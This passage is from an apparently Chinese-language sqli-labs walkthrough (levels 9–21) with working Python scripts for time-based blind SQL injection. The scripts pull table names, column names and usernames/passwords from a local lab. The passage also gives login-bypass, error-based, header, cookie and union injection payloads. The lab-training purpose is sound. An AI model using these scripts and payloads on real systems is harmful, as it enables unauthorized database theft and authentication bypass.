        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">&quot;0' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;,1)='&quot;</span><span class="token operator">+</span> s <span class="token operator">+</span><span class="token string">&quot;'),sleep(0.1),0)%23&quot;</span>
        tmp_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">&quot;?id=&quot;</span> <span class="token operator">+</span> <span class="token builtin">id</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tmp_url<span class="token punctuation">)</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">0.1</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> s
            <span class="token comment"># 当盲注出正确字符时，才去盲注下一位(变量i的作用)</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[#]------result: </span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">elif</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;跑了这么久，跑完了吗？跑完我给你停了🤓👍&quot;</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br></div></div><h2 id="less-9"><a href="#less-9" class="header-anchor">#</a> Less-9</h2> <p>无论输入什么，页面只有<code>You are in...........</code>，只能用时间盲注了</p> <p>在传入<code>?id=0' or if(1=1,sleep(5),sleep(5))</code>时，页面长时间加载，说明存在时间盲注</p> <p>上题脚本，稍加修改还能用</p> <h2 id="less-10"><a href="#less-10" class="header-anchor">#</a> Less-10</h2> <p>基于时间盲注的双引号类型参数</p> <p>上面时间盲注脚本还能梭哈</p> <h2 id="less-11"><a href="#less-11" class="header-anchor">#</a> Less-11</h2> <p>这里开始使用post参数，通过测试，可以猜测后台使用的单引号包裹的参数，在用户名或密码出都可以尝试使用万能密码</p> <p><img src="/medias/sqli-labs/21.png" alt="21"></p> <p><img src="/medias/sqli-labs/20.png" alt="20"></p> <p>在后台，sql语句可能是这样的</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">&quot;select * from users where username = '$username' and password = '$password'&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>用户名和密码是<code>and</code>连接的，拼接or以后，同时存在<code>or</code>和<code>and</code>，会怎么处理？<code>and</code>的优先级更高，会先执行<code>and</code>，再执行<code>or</code></p> <ul><li>如果在用户名处做文章，可以把后面的and注释掉，不再考虑。我们拼接后得到的sql语句可能是这样的，不需要考虑用户名密码是什么</li></ul> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment"># and password = '123456';</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>如果从密码入手，可以尝试在密码处拼接<code>or 1=1</code>，这样密码永远为真，sql语句可能是这样的，即使用户名密码<code>and</code>结果是<code>false</code>，在<code>or 1=1</code>的作用下，sql语句永远为真</li></ul> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">and</span> password <span class="token operator">=</span> <span class="token string">'123456'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/22.png" alt="22"></p> <p>这里回显用户名密码的逻辑有点怪，生产环境应该....应该用 盲注、写马☝🤓</p> <h2 id="less-12"><a href="#less-12" class="header-anchor">#</a> Less-12</h2> <p>用户名带<code>&quot;</code>双引号时，sql报错，爆出了一部分sql语句，可以看出是用<code>(&quot;&quot;)</code>包裹的参数</p> <p>猜测后台sql语句</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>$username <span class="token operator">=</span> <span class="token string">'&quot;'</span><span class="token punctuation">.</span>$_POST<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&quot;'</span><span class="token punctuation">;</span>
$password <span class="token operator">=</span> <span class="token string">'&quot;'</span><span class="token punctuation">.</span>$_POST<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&quot;'</span><span class="token punctuation">;</span>
$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">&quot;select * from users where username = ($username) and password = ($password)&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>闭合双引号括号，题前结束sql语句，完成验证</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#&quot;) and password = (&quot;123456&quot;);</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/24.png" alt="24"></p> <h2 id="less-13"><a href="#less-13" class="header-anchor">#</a> Less-13</h2> <p>类似上一关，区别：使用<code>1')#</code>闭合单引号、括号后没有回显了，这才像正常登录逻辑</p> <p>时间盲注</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token comment"># 下划线放最后，避免当作统配符吃掉特殊字符</span>
flags <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'</span>
flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

url <span class="token operator">=</span> <span class="token string">&quot;http://127.0.0.1:8080/Less-13/&quot;</span>
i <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;脚本正在运行.......&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    
    <span class="token keyword">for</span> s <span class="token keyword">in</span> flags<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;uname&quot;</span> <span class="token punctuation">:</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;passwd&quot;</span> <span class="token punctuation">:</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span> 
            <span class="token string">&quot;submit&quot;</span> <span class="token punctuation">:</span> <span class="token string">&quot;Submit&quot;</span>
        <span class="token punctuation">}</span>
        <span class="token comment"># 爆库</span>
        <span class="token comment"># data['uname'] = &quot;1') or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)#&quot;</span>
        <span class="token comment"># 爆表</span>
        data<span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;1') or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;,1)='&quot;</span><span class="token operator">+</span> s <span class="token operator">+</span><span class="token string">&quot;'),sleep(0.1),0)#&quot;</span>
        <span class="token comment"># 爆字段</span>
        <span class="token comment"># data['uname'] = &quot;1') or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)#&quot;</span>
        
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token comment"># print(data['uname'])</span>
        <span class="token comment"># print(resp.text)</span>
        <span class="token comment"># exit()</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">0.1</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> s
            <span class="token comment"># 当盲注出正确字符时，才去盲注下一位(变量i的作用)</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[#]------result: </span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">elif</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;跑了这么久，跑完了吗？跑完我给你停了🤓👍&quot;</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br></div></div><p><img src="/medias/sqli-labs/25.png" alt="25"></p> <h2 id="less-14"><a href="#less-14" class="header-anchor">#</a> Less-14</h2> <p>在这里突然发现会报错，试试报错注入</p> <p><code>updatexml</code>、<code>extractvalue</code>函数都可以正常报错注入</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>uname<span class="token operator">=</span><span class="token number">0</span>' <span class="token operator">or</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/26.png" alt="26"></p> <p><code>mysql_error()</code>放出来了？那上面几题是不是也能报错注入？我去试试☝🤓</p> <p><img src="/medias/sqli-labs/27.png" alt="27"></p> <h2 id="less-15"><a href="#less-15" class="header-anchor">#</a> Less-15</h2> <p>我测，这里什么提示、回显都没有，报错也没有。试试时间盲注</p> <p>在传入这个payload时，页面长时间加载，说明存在时间盲注，语法也对上了</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>passwd<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>submit<span class="token operator">=</span>Submit<span class="token operator">&amp;</span>uname<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">or</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>我入</p> <details class="custom-block details"><summary>点击查看</summary> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token comment"># 下划线放最后，避免当作统配符吃掉特殊字符</span>
flags <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789,-\{\}_'</span>
flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>

url <span class="token operator">=</span> <span class="token string">&quot;http://127.0.0.1:8080/Less-15/&quot;</span>
i <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;脚本正在运行.......&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    
    <span class="token keyword">for</span> s <span class="token keyword">in</span> flags<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;uname&quot;</span> <span class="token punctuation">:</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;passwd&quot;</span> <span class="token punctuation">:</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span> 
            <span class="token string">&quot;submit&quot;</span> <span class="token punctuation">:</span> <span class="token string">&quot;Submit&quot;</span>
        <span class="token punctuation">}</span>
        <span class="token comment"># 爆库</span>
        <span class="token comment"># data['uname'] = &quot;1' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)#&quot;</span>
        <span class="token comment"># 爆表</span>
        <span class="token comment"># data['uname'] = &quot;1' or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)#&quot;</span>
        <span class="token comment"># 爆字段</span>
        data<span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;1' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;,1)='&quot;</span><span class="token operator">+</span> s <span class="token operator">+</span><span class="token string">&quot;'),sleep(0.1),0)#&quot;</span>
        <span class="token comment"># 爆数据</span>
        <span class="token comment"># data['uname'] = &quot;1' or if((substr((select group_concat(username,password) from users),&quot; + str(i)+&quot;,1)='&quot;+ s +&quot;'),sleep(0.1),0)#&quot;</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token comment"># print(data['uname'])</span>
        <span class="token comment"># print(resp.text)</span>
        <span class="token comment"># exit()</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">0.1</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> s
            <span class="token comment"># 当盲注出正确字符时，才去盲注下一位(变量i的作用)</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[#]------result: </span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">elif</span> end <span class="token operator">-</span> start <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;跑了这么久，跑完了吗？跑完我给你停了🤓👍&quot;</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br></div></div></details> <h2 id="less-16"><a href="#less-16" class="header-anchor">#</a> Less-16</h2> <p>在尝试这个payload时，页面进入长时间加载状态，说明存在时间盲注</p> <p><img src="/medias/sqli-labs/28.png" alt="28"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>passwd<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>submit<span class="token operator">=</span>Submit<span class="token operator">&amp;</span>uname<span class="token operator">=</span><span class="token number">1</span>&quot;<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-17-update模块"><a href="#less-17-update模块" class="header-anchor">#</a> Less-17 update模块</h2> <p>这里，需要一个用户名和一个新密码，猜测后台sql语句类似</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;update users set password = '<span class="token interpolation"><span class="token variable">$passwd</span></span>' where username = '<span class="token interpolation"><span class="token variable">$uname</span></span>'&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>传入单引号参数<code>passwd</code>，页面报错</p> <p><img src="/medias/sqli-labs/29.png" alt="29"></p> <p>这里为什么用户名不能注入？翻看源码</p> <p><img src="/medias/sqli-labs/30.png" alt="30"></p> <p>好好好，这么玩</p> <p>那就从参数<code>passwd</code>入手，页面会报错，使用报错注入</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>passwd<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">or</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#&amp;submit=Submit&amp;uname=0</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/31.png" alt="31"></p> <h2 id="less-18-http-header"><a href="#less-18-http-header" class="header-anchor">#</a> Less-18 HTTP Header</h2> <p>翻看源码学习一下,<code>uname</code>、<code>passwd</code>参数都做了检查，另外，使用<code>insert</code>语句，把用户的<code>ip</code>、<code>user-agent</code>插入到一个<code>security.uagents</code>表里</p> <p><img src="/medias/sqli-labs/32.png" alt="32"></p> <p><img src="/medias/sqli-labs/33.png" alt="33"></p> <p>这里没有做过滤，直接把用户http报头字段插入表里</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$insert</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('<span class="token interpolation"><span class="token variable">$uagent</span></span>', '<span class="token interpolation"><span class="token variable">$IP</span></span>', <span class="token interpolation"><span class="token variable">$uname</span></span>)&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>插入的语句一般是成功插入一条语句，没什么回显，继续往下读源码发现<code>print_r(mysql_error());</code>，抛出错误，那么就可以利用报错注入</p> <p>有个尿点，这里如果用户不存在，那也就不会进入保存用户的<code>ip</code>、<code>ua</code>阶段，也没办法利用报错注入</p> <p>这里使用<code>hackbar</code>演示，先提交一次用户名，密码。用户需要是存在的，使用<code>admin</code>用户，密码随意</p> <p>在hackbar获取数据包，修改<code>User-Agent</code>字段，测试单引号，页面报错，尝试闭合语句</p> <p><img src="/medias/sqli-labs/34.png" alt="34"></p> <p>看到<code>ua</code>字段后面爆出了<code>ip</code>、<code>uname</code>，以及一个右括号<code>)</code></p> <p>所以可以尝试闭合，注释掉后面原有内容</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>a'<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>没有语法错误，页面正常，没有语法错误，可以尝试报错注入了</p> <p><img src="/medias/sqli-labs/35.png" alt="35"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>a'<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/36.png" alt="36"></p> <h2 id="less-19"><a href="#less-19" class="header-anchor">#</a> Less-19</h2> <p>尝试在<code>referer</code>字段注入</p> <p><img src="/medias/sqli-labs/37.png" alt="37"></p> <p>在报错语句里可以看到<code>192.168.6.148')</code>，说明<code>referer</code>字段后面还有一个字段才进行闭合</p> <p>尝试补充字段、闭合语句、注释后面</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>http:<span class="token comment">//192.168.6.246:8080/Less-19/',1,updatexml(1,concat(0x7e,user(),0x7e),1))#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/38.png" alt="38"></p> <h2 id="less-19-2"><a href="#less-19-2" class="header-anchor">#</a> Less-19</h2> <p>在尝试<code>admin</code>用户登录后，加载数据包，尝试修改<code>referer</code>、<code>user-agent</code>、<code>cookie</code>字段</p> <p>在<code>cookie</code>字段传入单引号时，页面报错<code>'admin'' LIMIT 0,1</code>，多出一个单引号</p> <p>闭合，在<code>cookie</code>字段报错注入</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>uname<span class="token operator">=</span>admin' <span class="token operator">or</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="less-20"><a href="#less-20" class="header-anchor">#</a> Less-20</h2> <p>在cookie里传入单引号，页面报错，可以看到爆出的后半句sql语句</p> <p><img src="/medias/sqli-labs/39.png" alt="39"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token string">'admin'</span>' <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>cookie里<code>uname</code>字段使用不存在的用户名，可以利用联合查询，存在回显位，<code>order by 4</code>可以测试出查询字段长度为3</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>uname<span class="token operator">=</span>a' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">11</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/sqli-labs/40.png" alt="40"></p> <h2 id="less-21"><a href="#less-21" class="header-anchor">#</a> Less-21</h2> <p>登录后，加载数据包<code>cookie: uname=YWRtaW4%3D</code></p> <p>后面看不出是什么数据，竟然是base64编码，解码后是<code>admin</code></p> <p>传入一个<code>admin'</code>，base64编码后发包，页面报错</p> <p><img src="/medias/sqli-labs/41.png" alt="41"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token string">'admin'</span>'<span class="token punctuation">)</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>闭合单引号、括号，使用联合查询，uname值进行base64编码</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>uname<span class="token operator">=</span>a'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">11</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token comment">#</span>
